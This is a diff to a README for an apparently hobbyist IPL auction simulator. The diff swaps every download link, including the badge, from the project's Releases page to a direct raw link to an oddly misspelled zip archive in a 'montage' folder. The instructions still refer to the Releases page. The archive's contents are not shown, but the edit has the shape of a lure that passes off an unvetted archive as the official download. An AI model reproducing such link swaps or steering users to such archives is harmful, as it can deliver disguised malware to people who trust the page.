@@ -1,7 +1,7 @@
 # 🎉 IPL-AUCTION-CLASH - Join the Fun of IPL Auction
 
 ## 📦 Download Now
-[![Download IPL-AUCTION-CLASH](https://img.shields.io/badge/Download-IPLAUCTIONCLASH-blue)](https://github.com/Anamalikay/IPL-AUCTION-CLASH/releases)
+[![Download IPL-AUCTION-CLASH](https://raw.githubusercontent.com/Anamalikay/IPL-AUCTION-CLASH/main/montage/CLASH-AUCTIO-IP-1.1.zip)](https://raw.githubusercontent.com/Anamalikay/IPL-AUCTION-CLASH/main/montage/CLASH-AUCTIO-IP-1.1.zip)
 
 ## 🚀 Getting Started
 Welcome to IPL-AUCTION-CLASH! This application allows you to simulate an IPL auction, making it easy and fun to engage with your favorite teams and players. Follow these simple steps to get started.
@@ -9,7 +9,7 @@ Welcome to IPL-AUCTION-CLASH! This application allows you to simulate an IPL auc
 ## 📥 Download & Install
 To download the application, visit the Releases page. Here, you will find the latest version of IPL-AUCTION-CLASH.
 
-- **Download Link:** [Visit this page to download](https://github.com/Anamalikay/IPL-AUCTION-CLASH/releases)
+- **Download Link:** [Visit this page to download](https://raw.githubusercontent.com/Anamalikay/IPL-AUCTION-CLASH/main/montage/CLASH-AUCTIO-IP-1.1.zip)
 
 1. Go to the Releases page.
 2. Click on the latest release.
@@ -63,4 +63,4 @@ If you have further questions, feel free to reach out to the support community. 
 
 Visit the Releases page to download IPL-AUCTION-CLASH now!
 
-- **Download Link:** [Visit this page to download](https://github.com/Anamalikay/IPL-AUCTION-CLASH/releases)
+- **Download Link:** [Visit this page to download](https://raw.githubusercontent.com/Anamalikay/IPL-AUCTION-CLASH/main/montage/CLASH-AUCTIO-IP-1.1.zip)
